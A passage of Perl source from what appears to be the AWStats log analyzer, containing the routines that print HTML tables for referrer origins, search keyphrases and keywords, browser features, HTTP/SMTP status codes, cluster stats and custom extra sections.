    #------- Referrals by direct address/bookmark/link in email/etc...
    print "<tr><td class=\"aws\"><b>$Message[38]</b></td>";
    if ( $ShowOriginStats =~ /P/i ) {
        print "<td>"
            . ( $_from_p[0] ? Format_Number($_from_p[0]) : "&nbsp;" )
            . "</td><td>"
            . ( $_from_p[0] ? "$p_p[0] %" : "&nbsp;" ) . "</td>";
    }
    if ( $ShowOriginStats =~ /H/i ) {
        print "<td>"
            . ( $_from_h[0] ? Format_Number($_from_h[0]) : "&nbsp;" )
            . "</td><td>"
            . ( $_from_h[0] ? "$p_h[0] %" : "&nbsp;" ) . "</td>";
    }
    print "</tr>\n";

    #------- Referrals by search engines
    print "<tr"
        . Tooltip(13)
        . "><td class=\"aws\"><b>$Message[40]</b> - <a href=\""
        . (
        $ENV{'GATEWAY_INTERFACE'}
            || !$StaticLinks
            ? XMLEncode("$AWScript${NewLinkParams}output=refererse")
            : "$StaticLinks.refererse.$StaticExt"
    )
        . "\"$NewLinkTarget>$Message[80]</a><br />\n";
    if ( scalar keys %_se_referrals_h ) {
        print "<table>\n";
        my $total_p = 0;
        my $total_h = 0;
        my $count = 0;
        &BuildKeyList(
            $MaxNbOf{'RefererShown'},
            $MinHit{'Refer'},
            \%_se_referrals_h,
            (
                ( scalar keys %_se_referrals_p )
                    ? \%_se_referrals_p
                    : \%_se_referrals_h
            )
        );
        foreach my $key (@keylist) {
            my $newreferer = $SearchEnginesHashLib{$key}
                || CleanXSS($key);
            print "<tr><td class=\"aws\">- $newreferer</td>";
            print "<td>"
                . (
                Format_Number($_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' ))
                . "</td>";
            print "<td> / ".Format_Number($_se_referrals_h{$key})."</td>";
            print "</tr>\n";
            $total_p += $_se_referrals_p{$key};
            $total_h += $_se_referrals_h{$key};
            $count++;
        }
        if ($Debug) {
            debug(
                "Total real / shown : $TotalSearchEnginesPages / $total_p -  $TotalSearchEnginesHits / $total_h",
                2
            );
        }
        my $rest_p = $TotalSearchEnginesPages - $total_p;
        my $rest_h = $TotalSearchEnginesHits - $total_h;
        if ( $rest_p > 0 || $rest_h > 0 ) {
            print
                "<tr><td class=\"aws\"><span style=\"color: #$color_other\">- $Message[2]</span></td>";
            print "<td>".Format_Number($rest_p)."</td>";
            print "<td> / ".Format_Number($rest_h)."</td>";
            print "</tr>\n";
        }
        print "</table>";
    }
    print "</td>\n";
    if ( $ShowOriginStats =~ /P/i ) {
        print "<td valign=\"top\">"
            . ( $_from_p[2] ? Format_Number($_from_p[2]) : "&nbsp;" )
            . "</td><td valign=\"top\">"
            . ( $_from_p[2] ? "$p_p[2] %" : "&nbsp;" ) . "</td>";
    }
    if ( $ShowOriginStats =~ /H/i ) {
        print "<td valign=\"top\">"
            . ( $_from_h[2] ? Format_Number($_from_h[2]) : "&nbsp;" )
            . "</td><td valign=\"top\">"
            . ( $_from_h[2] ? "$p_h[2] %" : "&nbsp;" ) . "</td>";
    }
    print "</tr>\n";

    #------- Referrals by external HTML link
    print "<tr"
        . Tooltip(14)
        . "><td class=\"aws\"><b>$Message[41]</b> - <a href=\""
        . (
        $ENV{'GATEWAY_INTERFACE'}
            || !$StaticLinks
            ? XMLEncode("$AWScript${NewLinkParams}output=refererpages")
            : "$StaticLinks.refererpages.$StaticExt"
    )
        . "\"$NewLinkTarget>$Message[80]</a><br />\n";
    if ( scalar keys %_pagesrefs_h ) {
        print "<table>\n";
        my $total_p = 0;
        my $total_h = 0;
        my $count = 0;
        &BuildKeyList(
            $MaxNbOf{'RefererShown'},
            $MinHit{'Refer'},
            \%_pagesrefs_h,
            (
                ( scalar keys %_pagesrefs_p )
                    ? \%_pagesrefs_p
                    : \%_pagesrefs_h
            )
        );
        foreach my $key (@keylist) {
            print "<tr><td class=\"aws\">- ";
            &HTMLShowURLInfo($key);
            print "</td>";
            print "<td>"
                . Format_Number(( $_pagesrefs_p{$key} ? $_pagesrefs_p{$key} : '0' ))
                . "</td>";
            print "<td>".Format_Number($_pagesrefs_h{$key})."</td>";
            print "</tr>\n";
            $total_p += $_pagesrefs_p{$key};
            $total_h += $_pagesrefs_h{$key};
            $count++;
        }
        if ($Debug) {
            debug(
                "Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h",
                2
            );
        }
        my $rest_p = $TotalRefererPages - $total_p;
        my $rest_h = $TotalRefererHits - $total_h;
        if ( $rest_p > 0 || $rest_h > 0 ) {
            print
                "<tr><td class=\"aws\"><span style=\"color: #$color_other\">- $Message[2]</span></td>";
            print "<td>".Format_Number($rest_p)."</td>";
            print "<td>".Format_Number($rest_h)."</td>";
            print "</tr>\n";
        }
        print "</table>";
    }
    print "</td>\n";
    if ( $ShowOriginStats =~ /P/i ) {
        print "<td valign=\"top\">"
            . ( $_from_p[3] ? Format_Number($_from_p[3]) : "&nbsp;" )
            . "</td><td valign=\"top\">"
            . ( $_from_p[3] ? "$p_p[3] %" : "&nbsp;" ) . "</td>";
    }
    if ( $ShowOriginStats =~ /H/i ) {
        print "<td valign=\"top\">"
            . ( $_from_h[3] ? Format_Number($_from_h[3]) : "&nbsp;" )
            . "</td><td valign=\"top\">"
            . ( $_from_h[3] ? "$p_h[3] %" : "&nbsp;" ) . "</td>";
    }
    print "</tr>\n";

    #------- Referrals by internal HTML link
    if ($IncludeInternalLinksInOriginSection) {
        print "<tr><td class=\"aws\"><b>$Message[42]</b></td>";
        if ( $ShowOriginStats =~ /P/i ) {
            print "<td>"
                . ( $_from_p[4] ? Format_Number($_from_p[4]) : "&nbsp;" )
                . "</td><td>"
                . ( $_from_p[4] ? "$p_p[4] %" : "&nbsp;" ) . "</td>";
        }
        if ( $ShowOriginStats =~ /H/i ) {
            print "<td>"
                . ( $_from_h[4] ? Format_Number($_from_h[4]) : "&nbsp;" )
                . "</td><td>"
                . ( $_from_h[4] ? "$p_h[4] %" : "&nbsp;" ) . "</td>";
        }
        print "</tr>\n";
    }

    #------- Referrals by news group
    #print "<tr><td class=\"aws\"><b>$Message[107]</b></td>";
    #if ($ShowOriginStats =~ /P/i) { print "<td>".($_from_p[5]?$_from_p[5]:"&nbsp;")."</td><td>".($_from_p[5]?"$p_p[5] %":"&nbsp;")."</td>"; }
    #if ($ShowOriginStats =~ /H/i) { print "<td>".($_from_h[5]?$_from_h[5]:"&nbsp;")."</td><td>".($_from_h[5]?"$p_h[5] %":"&nbsp;")."</td>"; }
    #print "</tr>\n";

    #------- Unknown origin
    print "<tr><td class=\"aws\"><b>$Message[39]</b></td>";
    if ( $ShowOriginStats =~ /P/i ) {
        print "<td>"
            . ( $_from_p[1] ? Format_Number($_from_p[1]) : "&nbsp;" )
            . "</td><td>"
            . ( $_from_p[1] ? "$p_p[1] %" : "&nbsp;" ) . "</td>";
    }
    if ( $ShowOriginStats =~ /H/i ) {
        print "<td>"
            . ( $_from_h[1] ? Format_Number($_from_h[1]) : "&nbsp;" )
            . "</td><td>"
            . ( $_from_h[1] ? "$p_h[1] %" : "&nbsp;" ) . "</td>";
    }
    print "</tr>\n";
    &tab_end();

    # 0: Direct
    # 1: Unknown
    # 2: SE
    # 3: External link
    # 4: Internal link
    # 5: Newsgroup (deprecated)
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases and Keywords chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainKeys{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($ShowKeyphrasesStats) {
        print "$Center<a name=\"keyphrases\">&nbsp;</a>";
    }
    if ($ShowKeywordsStats) {
        print "$Center<a name=\"keywords\">&nbsp;</a>";
    }
    if ( $ShowKeyphrasesStats || $ShowKeywordsStats ) { print "<br />\n"; }
    if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
        print
            "<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
    }
    if ($ShowKeyphrasesStats) {

        # By Keyphrases
        if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
            print "<td width=\"50%\" valign=\"top\">\n";
        }
        if ($Debug) { debug( "ShowKeyphrasesStats", 2 ); }
        &tab_head(
            "$Message[120] ($Message[77] $MaxNbOf{'KeyphrasesShown'})<br /><a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=keyphrases")
                    : "$StaticLinks.keyphrases.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[80]</a>",
            19,
            ( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
            'keyphrases'
        );
        print "<tr bgcolor=\"#$color_TableBGRowTitle\""
            . Tooltip(15)
            . "><th>$TotalDifferentKeyphrases $Message[103]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[14]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
        my $total_s = 0;
        my $count = 0;
        &BuildKeyList( $MaxNbOf{'KeyphrasesShown'},
            $MinHit{'Keyphrase'}, \%_keyphrases, \%_keyphrases );
        foreach my $key (@keylist) {
            my $mot;

            # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
            if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
                $mot = CleanXSS(
                    DecodeKey_decodeutfkeys(
                        $key, $PageCode || 'iso-8859-1'
                    )
                );
            }
            else { $mot = CleanXSS( DecodeEncodedString($key) ); }
            my $p;
            if ($TotalKeyphrases) {
                $p =
                    int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
            }
            print "<tr><td class=\"aws\">"
                . XMLEncode($mot)
                . "</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
            $total_s += $_keyphrases{$key};
            $count++;
        }
        if ($Debug) {
            debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
        }
        my $rest_s = $TotalKeyphrases - $total_s;
        if ( $rest_s > 0 ) {
            my $p;
            if ($TotalKeyphrases) {
                $p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
            }
            print
                "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[124]</span></td><td>$rest_s</td>";
            print "<td>$p&nbsp;%</td></tr>\n";
        }
        &tab_end();
        if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
            print "</td>\n";
        }
    }
    if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
        print "<td> &nbsp; </td>";
    }
    if ($ShowKeywordsStats) {

        # By Keywords
        if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
            print "<td width=\"50%\" valign=\"top\">\n";
        }
        if ($Debug) { debug( "ShowKeywordsStats", 2 ); }
        &tab_head(
            "$Message[121] ($Message[77] $MaxNbOf{'KeywordsShown'})<br /><a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'}
                    || !$StaticLinks
                    ? XMLEncode("$AWScript${NewLinkParams}output=keywords")
                    : "$StaticLinks.keywords.$StaticExt"
            )
                . "\"$NewLinkTarget>$Message[80]</a>",
            19,
            ( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
            'keywords'
        );
        print "<tr bgcolor=\"#$color_TableBGRowTitle\""
            . Tooltip(15)
            . "><th>$TotalDifferentKeywords $Message[13]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[14]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
        my $total_s = 0;
        my $count = 0;
        &BuildKeyList( $MaxNbOf{'KeywordsShown'},
            $MinHit{'Keyword'}, \%_keywords, \%_keywords );
        foreach my $key (@keylist) {
            my $mot;

            # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
            if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
                $mot = CleanXSS(
                    DecodeKey_decodeutfkeys(
                        $key, $PageCode || 'iso-8859-1'
                    )
                );
            }
            else { $mot = CleanXSS( DecodeEncodedString($key) ); }
            my $p;
            if ($TotalKeywords) {
                $p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
            }
            print "<tr><td class=\"aws\">"
                . XMLEncode($mot)
                . "</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
            $total_s += $_keywords{$key};
            $count++;
        }
        if ($Debug) {
            debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
        }
        my $rest_s = $TotalKeywords - $total_s;
        if ( $rest_s > 0 ) {
            my $p;
            if ($TotalKeywords) {
                $p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
            }
            print
                "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[30]</span></td><td>$rest_s</td>";
            print "<td>$p %</td></tr>\n";
        }
        &tab_end();
        if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
            print "</td>\n";
        }
    }
    if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
        print "</tr></table>\n";
    }
}

#------------------------------------------------------------------------------
# Function:     Prints the miscellaneous table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainMisc{
    if ($Debug) { debug( "ShowMiscStats", 2 ); }
    print "$Center<a name=\"misc\">&nbsp;</a><br />\n";
    my $title = "$Message[139]";
    &tab_head( "$title", 19, 0, 'misc' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[139]</th>";
    print "<th width=\"100\">&nbsp;</th>";
    print "<th width=\"100\">&nbsp;</th>";
    print "</tr>\n";
    my %label = (
        'AddToFavourites'           => $Message[137],
        'JavascriptDisabled'        => $Message[168],
        'JavaEnabled'               => $Message[140],
        'DirectorSupport'           => $Message[141],
        'FlashSupport'              => $Message[142],
        'RealPlayerSupport'         => $Message[143],
        'QuickTimeSupport'          => $Message[144],
        'WindowsMediaPlayerSupport' => $Message[145],
        'PDFSupport'                => $Message[146]
    );

    foreach my $key (@MiscListOrder) {
        my $mischar = substr( $key, 0, 1 );
        if ( $ShowMiscStats !~ /$mischar/i ) { next; }
        my $total = 0;
        my $p;
        if ( $MiscListCalc{$key} eq 'v' ) { $total = $TotalVisits; }
        if ( $MiscListCalc{$key} eq 'u' ) { $total = $TotalUnique; }
        if ( $MiscListCalc{$key} eq 'hm' ) {
            $total = $_misc_h{'TotalMisc'} || 0;
        }
        if ($total) {
            $p =
                int( ( $_misc_h{$key} ? $_misc_h{$key} : 0 ) / $total *
                    1000 ) / 10;
        }
        print "<tr>";
        print "<td class=\"aws\">"
            . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
            . $label{$key}
            . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
        if ( $MiscListCalc{$key} eq 'v' ) {
            print "<td>"
                . Format_Number(( $_misc_h{$key} || 0 ))
                . " / ".Format_Number($total)." $Message[12]</td>";
        }
        if ( $MiscListCalc{$key} eq 'u' ) {
            print "<td>"
                . Format_Number(( $_misc_h{$key} || 0 ))
                . " / ".Format_Number($total)." $Message[18]</td>";
        }
        if ( $MiscListCalc{$key} eq 'hm' ) { print "<td>-</td>"; }
        print "<td>" . ( $total ? "$p %" : "&nbsp;" ) . "</td>";
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHTTPStatus{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowHTTPErrorsStats", 2 ); }
    print "$Center<a name=\"errors\">&nbsp;</a><br />\n";
    my $title = "$Message[32]";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=ERRORS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'errors' );

    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
                push @blocklabel, "$key";
                $cnt++;
                if ($cnt > 4) { last; }
            }
            print "<tr><td colspan=\"5\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "$title",              "httpstatus",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[32]*</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th><th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th></tr>\n";
    my $total_h = 0;
    my $count = 0;
    foreach my $key (@keylist) {
        my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
        print "<tr" . Tooltip( $key, $key ) . ">";
        if ( $TrapInfosForHTTPErrorCodes{$key} ) {
            print "<td><a href=\""
                . (
                $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
                    ? XMLEncode(
                    "$AWScript${NewLinkParams}output=errors$key")
                    : "$StaticLinks.errors$key.$StaticExt"
            )
                . "\"$NewLinkTarget>$key</a></td>";
        }
        else { print "<td valign=\"top\">$key</td>"; }
        print "<td class=\"aws\">"
            . (
            $httpcodelib{$key} ? $httpcodelib{$key} : 'Unknown error' )
            . "</td><td>".Format_Number($_errors_h{$key})."</td><td>$p %</td><td>"
            . Format_Bytes( $_errors_k{$key} ) . "</td>";
        print "</tr>\n";
        $total_h += $_errors_h{$key};
        $count++;
    }
    &tab_end("* $Message[154]");
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSMTPStatus{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowSMTPErrorsStats", 2 ); }
    print "$Center<a name=\"errors\">&nbsp;</a><br />\n";
    my $title = "$Message[147]";
    &tab_head( "$title", 19, 0, 'errors' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">$Message[147]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th><th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th></tr>\n";
    my $total_h = 0;
    my $count = 0;
    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );

    foreach my $key (@keylist) {
        my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
        print "<tr" . Tooltip( $key, $key ) . ">";
        print "<td valign=\"top\">$key</td>";
        print "<td class=\"aws\">"
            . (
            $smtpcodelib{$key} ? $smtpcodelib{$key} : 'Unknown error' )
            . "</td><td>".Format_Number($_errors_h{$key})."</td><td>$p %</td><td>"
            . Format_Bytes( $_errors_k{$key} ) . "</td>";
        print "</tr>\n";
        $total_h += $_errors_h{$key};
        $count++;
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the cluster information chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCluster{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowClusterStats", 2 ); }
    print "$Center<a name=\"clusters\">&nbsp;</a><br />\n";
    my $title = "$Message[155]";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=CLUSTER&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'clusters' );

    &BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_cluster_p, \%_cluster_p );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int( $_cluster_p{$key} / $TotalHits * 1000 ) / 10;
                push @blocklabel, "$key";
                $cnt++;
                if ($cnt > 4) { last; }
            }
            print "<tr><td colspan=\"7\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "$title",              "cluster",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[155]</th>";
    &HTMLShowClusterInfo('__title__');
    if ( $ShowClusterStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    }
    if ( $ShowClusterStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    }
    if ( $ShowClusterStats =~ /B/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th><th bgcolor=\"#$color_k\" width=\"80\">$Message[15]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = 0;

    # Cluster feature might have been enable in middle of month so we recalculate
    # total for cluster section only, to calculate ratio, instead of using global total
    foreach my $key (@keylist) {
        $total_p += int( $_cluster_p{$key} || 0 );
        $total_h += int( $_cluster_h{$key} || 0 );
        $total_k += int( $_cluster_k{$key} || 0 );
    }
    my $count = 0;
    foreach my $key (@keylist) {
        my $p_p = int( $_cluster_p{$key} / $total_p * 1000 ) / 10;
        my $p_h = int( $_cluster_h{$key} / $total_h * 1000 ) / 10;
        my $p_k = int( $_cluster_k{$key} / $total_k * 1000 ) / 10;
        print "<tr>";
        print "<td class=\"aws\">Computer $key</td>";
        &HTMLShowClusterInfo($key);
        if ( $ShowClusterStats =~ /P/i ) {
            print "<td>"
                . ( $_cluster_p{$key} ? Format_Number($_cluster_p{$key}) : "&nbsp;" )
                . "</td><td>$p_p %</td>";
        }
        if ( $ShowClusterStats =~ /H/i ) {
            print "<td>".Format_Number($_cluster_h{$key})."</td><td>$p_h %</td>";
        }
        if ( $ShowClusterStats =~ /B/i ) {
            print "<td>"
                . Format_Bytes( $_cluster_k{$key} )
                . "</td><td>$p_k %</td>";
        }
        print "</tr>\n";
        $count++;
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints a chart or table for each extra section
# Parameters:   $NewLinkParams, $NewLinkTarget, $extranum
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainExtra{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;
    my $extranum = shift;

    if ($Debug) { debug( "ExtraName$extranum", 2 ); }
    print "$Center<a name=\"extra$extranum\">&nbsp;</a><br />";
    my $title = $ExtraName[$extranum];
    &tab_head( "$title", 19, 0, "extra$extranum" );
    print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
    print "<th>" . $ExtraFirstColumnTitle[$extranum];
    print "&nbsp; - &nbsp; <a href=\""
        . (
        $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
            ? XMLEncode(
            "$AWScript${NewLinkParams}output=allextra$extranum")
            : "$StaticLinks.allextra$extranum.$StaticExt"
    )
        . "\"$NewLinkTarget>$Message[80]</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        print "&nbsp; - &nbsp; <a href=\""
            . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=EXTRA_$extranum&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&sectionTitle=$ExtraName[$extranum]&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    print "</th>";

    if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th>";
    }
    if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"80\">$Message[75]</th>";
    }
    if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
        print "<th width=\"120\">$Message[9]</th>";
    }
    print "</tr>\n";
    my $total_p = my $total_h = my $total_k = 0;

    #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
    #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
    my $count = 0;
    if ( $MaxNbOfExtra[$extranum] ) {
        if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
            &BuildKeyList(
                $MaxNbOfExtra[$extranum],
                $MinHitExtra[$extranum],
                \%{ '_section_' . $extranum . '_h' },
                \%{ '_section_' . $extranum . '_p' }
            );
        }
        else {
            &BuildKeyList(
                $MaxNbOfExtra[$extranum],
                $MinHitExtra[$extranum],
                \%{ '_section_' . $extranum . '_h' },
                \%{ '_section_' . $extranum . '_h' }
            );
        }
    }
    else {
        @keylist = ();
    }
    my %keysinkeylist = ();
    foreach my $key (@keylist) {
        $keysinkeylist{$key} = 1;
        my $firstcol = CleanXSS( DecodeEncodedString($key) );
        $total_p += ${ '_section_' . $extranum . '_p' }{$key};
        $total_h += ${ '_section_' . $extranum . '_h' }{$key};
        $total_k += ${ '_section_' . $extranum . '_k' }{$key};
        print "<tr>";
        printf(
            "<td class=\"aws\">$ExtraFirstColumnFormat[$extranum]</td>",
            $firstcol, $firstcol, $firstcol, $firstcol, $firstcol );
        if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
            print "<td>"
                . ${ '_section_' . $extranum . '_p' }{$key} . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
            print "<td>"
                . ${ '_section_' . $extranum . '_h' }{$key} . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
            print "<td>"
                . Format_Bytes(
                ${ '_section_' . $extranum . '_k' }{$key} )
                . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
            print "<td>"
                . (
                ${ '_section_' . $extranum . '_l' }{$key}
                    ? Format_Date(
                    ${ '_section_' . $extranum . '_l' }{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";
        $count++;
    }

    # If we ask average or sum, we loop on all other records
    if ( $ExtraAddAverageRow[$extranum] || $ExtraAddSumRow[$extranum] )
    {
        foreach ( keys %{ '_section_' . $extranum . '_h' } ) {
            if ( $keysinkeylist{$_} ) { next; }
            $total_p += ${ '_section_' . $extranum . '_p' }{$_};
            $total_h += ${ '_section_' . $extranum . '_h' }{$_};
            $total_k += ${ '_section_' . $extranum . '_k' }{$_};
            $count++;
        }
    }

    # Add average row
    if ( $ExtraAddAverageRow[$extranum] ) {
        print "<tr>";
        print "<td class=\"aws\"><b>$Message[96]</b></td>";
        if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
            print "<td>"
                . ( $count ? Format_Number(( $total_p / $count )) : "&nbsp;" ) . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
            print "<td>"
                . ( $count ? Format_Number(( $total_h / $count )) : "&nbsp;" ) . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
            print "<td>"
                . (
                $count ? Format_Bytes( $total_k / $count ) : "&nbsp;" )
                . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
            print "<td>&nbsp;</td>";
        }
        print "</tr>\n";
    }

    # Add sum row
    if ( $ExtraAddSumRow[$extranum] ) {
        print "<tr>";
        print "<td class=\"aws\"><b>$Message[102]</b></td>";
        if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
            print "<td>" . Format_Number(($total_p)) . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
            print "<td>" . Format_Number(($total_h)) . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
            print "<td>" . Format_Bytes($total_k) . "</td>";
        }
        if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
            print "<td>&nbsp;</td>";
        }
        print "</tr>\n";
    }
    &tab_end();
}
